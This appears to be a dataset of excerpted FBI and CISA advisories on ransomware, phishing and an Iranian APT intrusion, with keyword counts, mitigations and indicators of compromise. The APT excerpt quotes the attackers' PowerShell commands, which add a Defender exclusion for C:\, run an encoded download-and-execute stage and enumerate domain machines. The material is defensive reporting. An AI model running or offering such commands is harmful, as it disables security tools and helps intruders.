criminal actors  to engage in the distribution of ransomware, and/or may fund illicit activities. RESOURCES  •  For more information and resources on protecting against and responding to ransomware,  refer to StopRansomware.gov, a centralized, whole-of-government webpage providing  ransomware resources and alerts. •  CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a  tiered set of practices to help organizations better assess how well they are equipped to  defend and recover from a ransomware incident. •  CISA offers a range of no-cost cyber hygiene services to help critical infrastructure  organizations assess, identify, and reduce their exposure to threats, including ransomware. See the ATT&CK for Enterprise for  all referenced threat actor tactics and  techniques. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. If threat  actors are not able to run these tools, they will have difficulty escalating privileges and/or  moving laterally. If possible, scan backup data with an antivirus program to check that it is  free of malware."

Personnel may open malicious attachments or links to execute  malicious payloads contained in emails from threat actors that have successfully  bypassed email filtering controls. o Threat actors likely seek to take advantage of perceived weaknesses among  organizations that either do not have—or choose not to prioritize—resources for IT/OT  infrastructure modernization. •  In March 2019, a former employee at Kansas-based WWS facility unsuccessfully attempted to  threaten drinking water safety by using his user credentials, which had not been revoked at  the time of his resignation, to remotely access a facility computer. RECOMMENDED MITIGATIONS  The FBI, CISA, EPA, and NSA recommend WWS facilities—including DoD water treatment facilities  in the United States and abroad—use a risk-informed analysis to determine the applicability of a  range of technical and non-technical mitigations to prevent, detect, and respond to cyber threats. Planning and Operational Mitigations  •  Ensure the organization’s emergency response plan considers the full range of potential  impacts that cyberattacks pose to operations, including loss or manipulation of view, loss or  manipulation of control, and threats to safety. These are systems that physically prevent  dangerous conditions from occurring if the control system is compromised by a threat actor. •  Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to- date signatures. Use a risk-based asset inventory strategy to determine how OT network  assets are identified and evaluated for the presence of malware."

Cyber Criminal Actors Targeting the Food and Agriculture Sector with Ransomware Attacks,2021-09-07,3,"{'phishing': 3, 'extortion': 3, 'personal_data_breach': 1, 'non_payment_non_delivery': 1, 'ransomware': 24, 'threats_of_violence': 8, 'malware': 3}","Although cyber criminals use a variety of techniques to infect  victims with ransomware, the most common means of infection are email phishing campaigns,  Remote Desktop Protocol (RDP) vulnerabilities, and software vulnerabilities. • In November 2020, a US-based international food and agriculture business reported it was  unable to access multiple computer systems tied to their network due to a ransomware attack  conducted by OnePercent Group threat actors using a phishing email with a malicious zip file  attachment. ransomware and phishing scams). Larger businesses are targeted based on their perceived  ability to pay higher ransom demands, while smaller entities may be seen as soft targets, particularly  those in the earlier stages of digitizing their processes, according to a private industry report. This double extortion potentially gives the attacker more leverage  to ensure payment, based on the potential damage caused by a significant data breach of sensitive  information. The highest observed ransom demand in 2020 was $23 million USD, according to a private  industry report. The company did not pay the $40 million ransom and was  able to successfully restore their systems from backups. Cyber Criminal Actors Targeting the Food  and Agriculture Sector with Ransomware  Attacks  Summary  Ransomware attacks targeting the Food and Agriculture sector disrupt  operations, cause financial loss, and negatively impact the food supply  chain. Ransomware may impact businesses across the sector, from  small farms to large producers, processors and manufacturers, and  markets and restaurants. Food and agriculture businesses victimized by ransomware suffer  significant financial loss resulting from ransom payments, loss of  productivity, and remediation costs. Companies may also experience  the loss of proprietary information and personally identifiable  information (PII) and may suffer reputational damage resulting from a  ransomware attack. In a ransomware attack, victims’ files are encrypted and made unavailable, and the attacker  demands a payment for the decryption tool and key. The impact of ransomware attacks continues to grow. According to the 2020 IC3 Report, IC3 received 2,474 complaints identified as  ransomware with adjusted losses of over $29.1 million across all sectors. Separate studies have  shown 50-80 percent of victims that paid the ransom experienced a repeat ransomware attack by  either the same or different actors. Examples of ransomware attacks impacting food and agriculture sector businesses include the  following:  • In July 2021, a US bakery company lost access to their server, files, and applications, halting their  production, shipping, and receiving as a result of Sodinokibi/REvil ransomware which was  deployed through software used by an IT support managed service provider (MSP). TLP:WHITE     TLP:WHITE  • In May 2021, cyber actors using a variant of the Sodinokibi/REvil ransomware compromised  computer networks in the US and overseas locations of a global meat processing company, which  resulted in the possible exfiltration of company data and the shutdown of some US-based plants  for several days. • In March 2021, a US beverage company suffered a ransomware attack that caused significant  disruption to its business operations, including its operations, production, and shipping. • In January 2021, a ransomware attack against an identified US farm resulted in losses of  approximately $9 million due to the temporary shutdown of their farming operations. The following steps can be implemented to mitigate the threat and protect  against ransomware attacks:  • Regularly back up data, air gap, and password protect backup copies offline.

Cyber criminal threat actors exploit network  vulnerabilities to exfiltrate data and encrypt systems in a sector that is  increasingly reliant on smart technologies, industrial control systems,  and internet-based automation systems. TLP:WHITE     TLP:WHITE    Threat Overview  The Food and Agriculture sector is among the critical infrastructure sectors increasingly targeted by  cyber attacks. Threat actors may apply additional coercive tactics such as convincing media  organizations to write stories on victim security incidents, harassing employees by phone, notifying  business partners of data theft, and conducting distributed denial of service attacks to further  disrupt operations. The  unidentified threat actor was able to target their internal servers by gaining administrator level  access through compromised credentials. Recommended Mitigations  Cyber criminal threat actors will continue to exploit network system vulnerabilities within the food  and agriculture sector. According to a private industry report, cyber actors may gradually broaden their  attack from just information technology (IT) and business processes to also include the operational  technology (OT) assets, which monitor and control physical processes, impacting industrial  production regardless of whether the malware was deployed in IT or OT systems. The  company took its systems offline to prevent the further spread of malware, directly impacting  employees who were unable to access specific systems, according to open source reports. • Install and regularly update anti-virus and anti-malware software on all hosts."
Ransomware Awareness for Holidays and Weekends,2021-08-31,3,"{'phishing': 2, 'extortion': 3, 'personal_data_breach': 1, 'ransomware': 31, 'threats_of_violence': 16, 'malware': 8}","Although cyber criminals use a variety of techniques to infect victims with ransomware, the two most  prevalent initial access vectors are phishing and brute forcing unsecured remote desktop protocol  (RDP) endpoints.   Implement a user training program and phishing exercises to raise awareness among users  about the risks involved in visiting malicious websites or opening malicious attachments and to  reinforce the appropriate user response to phishing and spearphishing emails. After DarkSide actors gained  access to the victim’s network, they deployed ransomware to encrypt victim data and—as a  secondary form of extortion—exfiltrated the data before threatening to publish it to further  pressure victims into paying the ransom demand. The number of  ransomware incidents also continues to rise, with 2,474 incidents reported in 2020, representing a 20  percent increase in the number of incidents, and a 225 percent increase in ransom demands. Cyber criminals  have also increasingly coupled initial encryption of data with a secondary form of extortion, in which  they threaten to publicly name affected victims and release sensitive or proprietary data exfiltrated                                                  1 This number includes only those victims who have provided information to IC3.

Ransomware Trends  The FBI's Internet Crime Complaint Center (IC3), which provides the public with a trustworthy source  for reporting information on cyber incidents, received 791,790 complaints for all types of internet  crime—a record number—from the American public in 2020, with reported losses exceeding $4.1  billion. From  January to July 31, 2021, the IC3 has received 2,084 ransomware complaints with over $16.8M in  losses, a 62 percent increase in reporting and 20 percent increase in reported losses compared to the  same time frame in 2020.1 The following ransomware variants have been the most frequently  reported to FBI in attacks over the last month.   Conti    PYSA    LockBit    RansomEXX/Defray777    Zeppelin    Crysis/Dharma/Phobos  The destructive impact of ransomware continues to evolve beyond encryption of IT assets. Cyber  criminals have increasingly targeted large, lucrative organizations and providers of critical services  with the expectation of higher value ransoms and increased likelihood of payments.   Gather information for follow-on attacks before deploying ransomware on the victim network. Threat actors can be  present on a victim network long before they lock down a system, alerting the victim to the  ransomware attack. Also  review the Ransomware Response Checklist in the CISA-MS-ISAC Joint Ransomware Guide. Cyber Hygiene Services  CISA offers a range of no-cost cyber hygiene services—including vulnerability scanning and  ransomware readiness assessments—to help critical infrastructure organizations assess, identify, and  reduce their exposure to cyber threats. RANSOMWARE BEST PRACTICES  The FBI and CISA strongly discourage paying a ransom to criminal actors. Regardless of whether you or your organization  decide to pay the ransom, the FBI and CISA urge you to report ransomware incidents to CISA, a local  FBI field office, or by filing a report with IC3 at IC3.gov. Government with  critical information needed to help victims, track ransomware attackers, hold attackers accountable  under U.S. RECOMMENDED MITIGATIONS  The FBI and CISA highly recommend organizations continuously and actively monitor for ransomware  threats over holidays and weekends.2 Additionally, the FBI and CISA recommend identifying IT  security employees to be available and ""on call"" during these times, in the event of a ransomware  attack. It is important that backups be  maintained offline as many ransomware variants attempt to find and delete or encrypt  accessible backups.   Create, maintain, and exercise a basic cyber incident response plan that:  o Includes procedures for response and notification in a ransomware incident and  o Plans for the possibility of critical systems being inaccessible for a period of time. Note: for help with developing your plan, review available incident response guidance, such  as the Public Power Cyber Incident Response Playbook and the Ransomware Response  Checklist in the CISA-MS-ISAC Joint Ransomware Guide. If your organization is impacted by a ransomware incident, the FBI and CISA recommend the  following actions. Power off and segregate any other computers or devices  that share a network with the infected computer(s) that have not been fully encrypted by  ransomware.

The FBI and CISA do not currently have any  specific threat reporting indicating a cyberattack will  occur over the upcoming Labor Day holiday. THREAT OVERVIEW  Recent Holiday Targeting  Cyber actors have conducted increasingly impactful attacks against U.S. The FBI and CISA do not currently have specific information  regarding cyber threats coinciding with upcoming holidays and weekends. THREAT HUNTING  The FBI and CISA suggest organizations engage in preemptive threat hunting on their networks. Threat hunting is a proactive strategy to search for signs of threat actor activity to prevent attacks  before they occur or to minimize damage in the event of a successful attack. Threat actors often search through a network to find and compromise the most  critical or lucrative targets. Threat hunting encompasses  the following elements of understanding the IT environment by developing a baseline through a  behavior-based analytics approach, evaluating data logs, and installing automated alerting systems. Indicators of suspicious activity that threat hunters should look for include:    Unusual inbound and outbound network traffic,    Compromise of administrator privileges or escalation of the permissions on an account,    Theft of login and password credentials,    Substantial increase in database read volume,    Geographical irregularities in access and log in patterns,    Attempted user activity during anomalous logon times,     Attempts to access folders on a server that are not linked to the HTML within the pages of the  web server, and    Baseline deviations in the type of outbound encrypted traffic since advanced persistent threat  actors frequently encrypt exfiltration. Threat actors use SMB to propagate malware across  organizations. Additional common means of initial infection include deployment of precursor or  dropper malware; exploitation of software or operating system vulnerabilities; exploitation of managed  service providers with access to customer networks; and the use of valid, stolen credentials, such as  those purchased on the dark web.

Indicators of Compromise Associated with Hive Ransomware,2021-08-25,3,"{'phishing': 1, 'extortion': 1, 'ransomware': 14, 'threats_of_violence': 5, 'malware': 3}","Hive ransomware uses multiple  mechanisms to compromise business networks, including phishing  emails with malicious attachments to gain access and Remote Desktop  Protocol (RDP) to move laterally once on the network. The ransom  note also informs victims that a public disclosure or leak site, accessible on a TOR browser, contains  data exfiltrated from victim companies who do not pay the ransom demand. Indicators of Compromise Associated with Hive  Ransomware    Summary    Hive ransomware, which was first observed in June 2021 and likely  operates as an affiliate-based ransomware, employs a wide variety of  tactics, techniques, and procedures (TTPs), creating significant  challenges for defense and mitigation. After compromising a victim network, Hive ransomware actors  exfiltrate data and encrypt files on the network. The ransom note also threatens to leak exfiltrated victim data on the  Tor site, “HiveLeaks.”     TLP:WHITE  TLP:WHITE      Technical Details  Hive ransomware seeks processes related to backups, anti-virus/anti-spyware, and file copying and  terminates them to facilitate file encryption. The Hive ransomware then drops a hive.bat script into the directory, which enforces an  execution timeout delay of one second in order to perform cleanup after the encryption is finished  by deleting the Hive executable and the hive.bat script. Indicators of Compromise   The following indicators were leveraged by the threat actors during Hive ransomware compromises. Paying a ransom may embolden  adversaries to target additional organizations, encourage other criminal actors to engage in the  distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization decide to pay the  ransom, the FBI urges you to report ransomware incidents to your local field office. Doing so  provides investigators with the critical information they need to track ransomware attackers, hold  them accountable under US law, and prevent future attacks. o The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing  & Analysis Center Joint Ransomware Guide covers additional best practices and ways  to prevent, protect, and respond to a ransomware attack. o StopRansomware.gov is the U.S. Government’s official one-stop location for resources  to tackle ransomware more effectively. If your organization is impacted by a ransomware incident, the FBI and CISA recommend the  following actions. Power-off and segregate any other computers or devices  that share a network with the infected computer(s) that have not been fully encrypted by  ransomware.

Potential for Malicious Cyber Activities to Disrupt the 2020 Tokyo Summer Olympics,2021-07-19,3,"{'phishing': 5, 'ransomware': 7, 'threats_of_violence': 7, 'malware': 4}","Potential for Malicious Cyber Activities to  Disrupt the 2020 Tokyo Summer Olympics     Summary  The FBI is warning entities associated with the Tokyo 2020 Summer  Olympics that cyber actors who wish to disrupt the event could use  distributed denial of service (DDoS) attacks, ransomware, social  engineering, phishing campaigns, or insider threats to block or disrupt  live broadcasts of the event, steal and possibly hack and leak or hold  hostage sensitive data, or impact public or private digital  infrastructure supporting the Olympics. Adversaries could use social engineering and  phishing campaigns in the lead up to the event to obtain access or use previously obtained  access to implant malware to disrupt affected networks during the event. Social engineering  and phishing campaigns continue to provide adversaries with the access needed to carry out  such attacks. Prior to the event, the actors targeted South  Korean citizens and officials, Olympic athletes, partners, visitors, and International Olympic  Committee officials with spearphishing campaigns and malicious mobile applications. To help prevent targeted social engineering,  ransomware, and phishing scams, ensure that employees and stakeholders are aware of  potential cyber threats and how they are delivered. Cyber actors could use ransomware or other malicious tools and services available for purchase  on the Internet to execute DDoS attacks against Internet service providers and/or television  broadcast companies to interrupt service during the Olympics. Ransomware Best Practices  The FBI does not recommend paying ransoms. Regardless of whether the ransom was paid, the FBI urges organizations to  report ransomware incidents to a local FBI field office or file a report with the FBI’s Internet  Crime Complaint Center (IC3) at IC3.gov.  Create, maintain, and exercise a basic cyber incident response plan that includes  procedures for response and notification in a ransomware incident and plans for the  possibility of critical systems being inaccessible for a period of time. Information on ransomware can be  filed with the FBI’s Internet Crime Complaint Center at IC3.gov.

The FBI to  date is not aware of any specific cyber threat against these Olympics,  but encourages partners to remain vigilant and maintain best practices  in their network and digital environments. TLP: WHITE     TLP: WHITE  Threat Overview   Large, high-profile events provide an opportunity for criminal and nation-state cyber actors to  make money, sow confusion, increase their notoriety, discredit adversaries, and advance  ideological goals. The FBI also suggests reviewing or establishing security                                 TLP: WHITE     TLP: WHITE  policies, user agreements, and patching plans to address current threats posed by malicious  cyber actors. Ensure that employees are aware of  what to do and who to contact when they see suspicious activity or suspect a cyber- attack, to help quickly and efficiently identify threats and employ mitigation strategies. The  Russian actors obfuscated the true source of the malware by emulating code used by a North  Korean group, creating the potential for misattribution.  Automatically update antivirus and anti-malware solutions and conduct regular virus  and malware scans. Payment does not guarantee files will be  recovered and may embolden malicious cyber actors to target additional organizations,  encourage other criminal actors to engage in the distribution of malware, and/or may fund  illicit activities."

Conti weaponizes Word  documents with embedded Powershell scripts, initially staging Cobalt Strike via the Word documents  and then dropping Emotet onto the network, giving the actor access to deploy ransomware. Actors  are observed inside the victim network between four days and three weeks on average before  deploying Conti ransomware, primarily using dynamic-link libraries (DLLs) for delivery. Once Conti actors deploy the ransomware, they may stay in the network and  beacon out using Anchor DNS. The attackers can use TrickBot to also drop other malware,  including Conti ransomware. The FBI does not encourage paying ransoms. It  may also embolden adversaries to target additional organizations, encourage other criminal actors  to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization  have decided to pay the ransom, the FBI urges you to promptly report ransomware incidents to your  local field office or the FBI’s 24/7 Cyber Watch (CyWatch). Doing so provides the FBI with critical  information needed to prevent future attacks by identifying and tracking ransomware attackers and  holding them accountable under U.S. TLP:WHITE   TLP:WHITE /    20 May 2021  Alert Number  CP-000147-MW  The following information is being provided by the FBI, with no  guarantees or warranties, for potential use at the sole discretion of  recipients in order to protect against cyber threats.  Install and regularly update anti-virus and anti-malware software on all hosts."

The Cybersecurity and Information Security Agency (CISA) and the Federal Bureau of Investigation  (FBI) are aware of a ransomware attack affecting a critical infrastructure (CI) entity—a pipeline  company—in the United States. Malicious cyber actors deployed Darkside ransomware against the  pipeline company’s information technology (IT) network.[1] At this time, there is no indication that the  entity’s operational technology (OT) networks have been directly affected by the ransomware. These mitigations will help CI owners and operators improve their entity's  functional resilience by reducing their vulnerability to ransomware and the risk of severe business  degradation if impacted by ransomware. FBI  |  CISA TLP:WHITE  Page 2 of 6  |  Product ID: AA21-131A  TLP: WHITE TECHNICAL DETAILS  After gaining initial access to the pipeline company’s network, Darkside actors deployed Darkside  ransomware against the company’s IT network. Darkside is ransomware-as-a-service (RaaS). The Darkside group develops ransomware used by  cybercriminal actors and receives a share of the proceeds. The actors then threaten to publicly release the data if the  ransom is not paid.[8],[9] The Darkside ransomware uses Salsa20 and RSA encryption.[10]  Darkside actors primarily use The Onion Router (TOR) for Command and Control (C2) [TA0011]  (Proxy: Multi-hop Proxy [1090.003]).[11],[12] The actors have also been observed using Cobalt Strike  for C2.[13]  MITIGATIONS  CISA and FBI urge CI owners and operators to apply the following mitigations to reduce the risk of  compromise by ransomware attacks. CISA and FBI urge CI owners and operators to apply the following mitigations now to reduce the risk  of severe business degradation should their CI entity fall victim to a ransomware attack in the future. Backups should be isolated from network connections  that could enable the spread of ransomware. It is important that backups be maintained  offline as many ransomware variants attempt to find and encrypt or delete accessible  backups. Maintaining current backups offline is critical because if your network data is  encrypted with ransomware, your organization can restore systems to its previous state. (See the Software Engineering Institute’s  page on ransomware.)  o Maintain regularly updated “gold images” of critical systems in the event they need  to be rebuilt. Implement software restriction policies (SRPs) or  other controls to prevent programs from executing from common ransomware locations,  such as temporary folders supporting popular internet browsers or  compression/decompression programs, including the AppData/LocalAppData folder. If your organization is impacted by a ransomware incident, CISA and FBI recommend the following  actions:  •  Isolate the infected system. Power-off and segregate any other computers or devices  that shared a network with the infected computer(s) that have not been fully encrypted by  ransomware. Paying a ransom may  embolden adversaries to target additional organizations, encourage other criminal actors to engage in  the distribution of ransomware, and/or may fund illicit activities. CISA offers a range of no-cost cyber hygiene services to help CI organizations assess, identify and  reduce their exposure to threats, including ransomware.

The applications listed in the IOCs were leveraged by the threat actors during  the course of a compromise. Some of these applications might appear within an organization's  enterprise to support legitimate purposes; however, these applications can be used by threat  actors to aid in malicious exploitation of an organization's enterprise. In response to the cyberattack, the company  proactively disconnected certain OT systems to ensure the safety of the OT systems.[2] At this time,  there are no indications that the threat actor moved laterally to OT systems. •  Set antivirus/antimalware programs to conduct regular scans of IT network assets using  up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network  assets are identified and evaluated for the presence of malware. If possible, scan  your backup data with an antivirus program to check that it is free of malware."
Spear-Phishing Attack Directing Recipients to Download a Fake Windows Application Impersonating a Financial Institution,2021-05-13,2,"{'phishing': 12, 'threats_of_violence': 2, 'malware': 1}","Spear-Phishing Attack Directing Recipients to  Download a Fake Windows Application  Impersonating a Financial Institution  Summary  In a recent spear-phishing campaign, cyber actors impersonated a US- based financial institution’s brand in an attempt to get recipients to  download a Windows application unaffiliated with the financial  institution. Threat Overview  In February 2021, a US-based financial institution was notified of a  spear-phishing attempt which impersonated the financial institution’s  brand to target a renewable energy company. The phishing e-mail’s  theme involved funding for a loan and instructed the recipient to  download a Windows application to complete the loan process to  receive more than $62 million. The phishing e-mail appeared to                                  TLP:WHITE    TLP:WHITE  originate from a United Kingdom–based financial institution, stating the US financial  institution’s loan to the victim was confirmed and could be accessed through an application  which appeared to  represent the US financial institution. The phishing e-mail included two  .pdf files, one of which spoofed the name and likeness of the UK’s National Crime Agency and  another which appeared to contain SWIFT information. The phishing e-mail also contained a  link to download the application and a username and password for access. As part of this spear-phishing campaign, the cyber actors also registered a fraudulent domain  impersonating the US financial institution. The below indicators were observed in conjunction with this spear-phishing campaign. The following files were attached to the spear-phishing e-mail:  Filename: Computer Feeder Message(Name Redacted).pdf  MD5: 57865182db4f963cf9ea7709384dd750  SHA256: bd45ae2cbc302bd219d4c59469d1ebb1f8049f3bd025bd19eb4572176b5176f5    Filename: Swift Copy(Name Redacted).pdf  MD5: fadcde66f6edf79442dce2be4f11ef60  SHA256: 375a0566bdfc04f8d24fae429a415434c679d3b5e7a7c97b8ddd5cea98e0aa0c    The following file was downloaded if the recipient clicked on the malicious link in the spear- phishing e-mail:    Filename: (Name Redacted).exe  MD5: 3d1111389aac89274f0eaf87c30732fe  SHA256: e09ae3c1ff5489f300ec9ecfc76ffdab90b6dab07eff1a0edf38285ab1e2b801      The malicious .exe file downloaded from the link embedded in the spear-phishing e-mail calls  out to the domain secureportal(.)online. Well-maintained anti-virus  software may prevent use of commonly deployed attacker tools delivered via  spear-phishing. Application control software limits users to  only execute applications and code allowed by the organization, rendering  malicious executables delivered via spear-phishing unable to execute. Users who browse the internet, use  email, and execute code with administrator privileges make spear-phishing much  more effective by enabling attackers to move laterally across a network, gain  additional accesses, and access highly sensitive information.

Egregor Ransomware Targets Businesses  Worldwide, Attempting to Extort Businesses  by Publicly Releasing Exfiltrated Data     Summary    The FBI first observed Egregor ransomware in September 2020. To  date, the threat actors behind this ransomware variant claim to have  compromised over 150 victims worldwide. The ransomware leaves a ransom note on  machines instructing the victim to communicate with the threat actors  via an online chat. TLP: WHITE    TLP: WHITE  Threat Overview    The FBI assesses Egregor ransomware is operating as a Ransomware as a Service Model. In this model,  multiple different individuals play a part in conducting a single intrusion and ransomware event. Egregor ransomware utilizes multiple mechanisms to compromise business networks, including targeting  business network and employee personal accounts that share access with business networks or devices. Once Egregor gains access to the network, Egregor ransomware affiliates use common pen testing and  exploit tools like Cobalt Strike, Qakbot/Qbot, Advanced IP Scanner, and AdFind to escalate privileges and  move laterally across a network, and tools like Rclone (sometimes renamed or hidden as svchost) and 7zip  to exfiltrate data. Paying a ransom emboldens adversaries to  target additional organizations, encourages other criminal actors to engage in the distribution of  ransomware, and/or may fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI urges you to  report ransomware incidents to your local FBI field office. Doing so provides the FBI with the critical  information they need to prevent future attacks by identifying and tracking ransomware attackers and  holding them accountable under US law.

This year, Cuba ransomware actors have added to their TTPs, and third-party and open-source  reports have identified a possible link between Cuba ransomware actors, RomCom Remote Access  Trojan (RAT) actors, and Industrial Spy ransomware actors. FBI and CISA encourage organizations to implement the recommendations in the Mitigations section  of this CSA to reduce the likelihood and impact of Cuba ransomware and other ransomware  operations. Actions to take today to mitigate  cyber threats from ransomware:  •  Prioritize remediating known  exploited vulnerabilities. (End of Update.)  TECHNICAL DETAILS  Overview  Since the December 2021 release of FBI Flash: Indicators of Compromise Associated with Cuba  Ransomware, FBI has observed Cuba ransomware actors continuing to target U.S. As of August 2022, FBI has  identified that Cuba ransomware actors have:  •  Compromised 101 entities, 65 in the United States and 36 outside the United States. Since spring 2022, Cuba ransomware actors have modified their TTPs and tools to interact with  compromised networks and extort payments from victims.[1],[2]  Cuba ransomware actors have exploited known vulnerabilities and weaknesses and have used tools  to elevate privileges on compromised systems. According to Palo Alto Networks Unit 42,[2] Cuba  ransomware actors have:  •  Exploited CVE-2022-24521 in the Windows Common Log File System (CLFS) driver to steal  system tokens and elevate privileges. According to Palo Alto Networks Unit 42, Cuba ransomware actors use tools to evade detection while  moving laterally through compromised environments before executing Cuba ransomware. According to  third-party reporting, suspected Cuba ransomware actors compromised a foreign healthcare  company. The threat actors deployed Industrial Spy ransomware, which shares distinct  similarities in configuration to Cuba ransomware. Before deploying the ransomware, the actors  moved laterally using Impacket and deployed the RomCom RAT and Meterpreter Reverse  Shell HTTP/HTTPS proxy via a C2 server [T1090]. •  Cuba ransomware actors initially used their leak site to sell stolen data; however, around May  2022, the actors began selling their data on Industrial Spy’s online market for selling stolen  data.[2]  RomCom actors have targeted foreign military organizations, IT companies, and food brokers and  manufacturers.[3][4] The actors copied legitimate HTML code from public-facing webpages, modified  the code, and then incorporated it in spoofed domains [T1584.001], which allowed the RomCom  actors to:   •  Host counterfeit Trojanized applications for   o SolarWinds Network Performance Monitor (NPM),  o KeePass password manager,   o PDF Reader Pro, (by PDF Technologies, Inc., not an Adobe Acrobat or Reader  product), and   o Advanced IP Scanner software;  •  Deploy the RomCom RAT as the final stage.

[2]               FBI  |  CISA   Page 17 of 19  | Product ID: AA22-335A  TLP:CLEAR TLP:CLEAR MITIGATIONS  FBI and CISA recommend network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise by Cuba ransomware:  •  Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers in a physically separate, segmented, and secure location (i.e., hard drive,  storage device, the cloud). •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting the  ransomware, implement a tool that logs and reports all network traffic, including lateral  movement activity on a network. RESOURCES  •  Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts. •  Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis  Center (MS-ISAC) Joint Ransomware Guide. •  No-cost Cyber Hygiene Services and Ransomware Readiness Assessment. REPORTING  FBI is seeking any information that can be shared, to include boundary logs showing communication  to and from foreign IP addresses, a sample ransom note, communications with ransomware actors,  Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit  activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and  CISA urge you to promptly report ransomware incidents immediately. To request incident response resources  or technical assistance related to these threats, contact CISA at Report@cisa.dhs.gov.

Product ID: AA22-320A November 16, 2022 TLP:CLEAR Co-Authored by:  Iranian Government-Sponsored APT Actors  Compromise Federal Network, Deploy Crypto  Miner, Credential Harvester  SUMMARY  From mid-June through mid-July 2022, CISA conducted an incident response engagement at a  Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced  persistent threat (APT) activity. In the course of incident response activities, CISA determined that  cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server,  installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised  credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence. CISA and FBI encourage all organizations with affected VMware systems that did not immediately  apply available patches or workarounds to assume compromise and initiate threat hunting activities. If  suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA,  CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate  connected systems (including the DC), and audit privileged accounts. For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s  Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threats webpage. See the MITRE  ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. In coordination with the FCEB organization, CISA initiated threat  hunting incident response activities; however, prior to deploying an incident response team, CISA  observed additional suspected APT activity. Based on trusted third-party  reporting, 51.89.181[.]64 is a Lightweight Directory Access Protocol (LDAP) server associated with  threat actors exploiting Log4Shell. As trusted-third party reporting associated Log4Shell activity from  51.89.181[.]64 with lateral movement and targeting of DCs, CISA suspected the threat actors had  moved laterally and compromised the organization’s DC. The threat actors  also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse  proxies. Threat Actor Activity  In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the  organization’s unpatched VMware Horizon server. The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an  exclusion rule to Windows Defender [T1562.001]:  powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added- exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc  ""$BASE64 encoded payload to download next stage and execute it""     ``      CISA | FBI TLP:CLEAR  Page 3 of 14  |  Product ID: AA22-320A  TLP:CLEAR The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the  c:\drive without virus scans. Once the threat actor established themselves on the  VDI-KMS host, CISA observed the actors download around 30 megabytes of files from  transfer[.]sh server associated with 144.76.136[.]153. Ngrok is known to be used for malicious purposes.[1]    The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue  domain administrator account [T1136.002]. The threat actors were able to implant Ngrok on multiple hosts to  ensure Ngrok’s persistence should they lose access to a machine during a routine reboot. It is possible, but was not observed, that the threat actors configured a  custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com,  *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com. Once the threat actors established a deep foothold in the network and moved laterally to the domain  controller, they executed the following PowerShell command on the Active Directory to obtain a list of  all machines attached to the domain [T1018]:  Powershell.exe get-adcomputer -filter * -properties * | select  name,operatingsystem,ipv4address &gt;   The threat actors also changed the password for the local administrator account [T1098] on several  hosts as a backup should the rogue domain administrator account get detected and terminated. Additionally, the threat actor was observed attempting to dump the Local Security Authority  Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by  additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES  See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as  corresponding detection and/or mitigation recommendations. Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise  Initial Access  Technique Title  ID  Use  Recommendations  Exploit Public- Facing Application  T1190  The actors exploited  Log4Shell for initial  access to the  organization’s VMware  Horizon server. INCIDENT RESPONSE   If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA  encourages organizations to assume lateral movement by threat actors and investigate connected  systems and the DC. MITIGATIONS  CISA and FBI recommend implementing the mitigations below and in table 1 to improve your  organization's cybersecurity posture on the basis of threat actor behaviors. Malicious  activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to  obtain hashed credentials that threat actors attempt to crack. VALIDATE SECURITY CONTROLS    In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your  organization's security program against the threat behaviors mapped to the MITRE ATT&CK for  Enterprise framework in this advisory. Mitigation: Employ anti-malware to  automatically detect and quarantine  malicious scripts [M1049]. Create Account:  Local Account  T1136.001  The actors’ malware  can create local user  accounts.

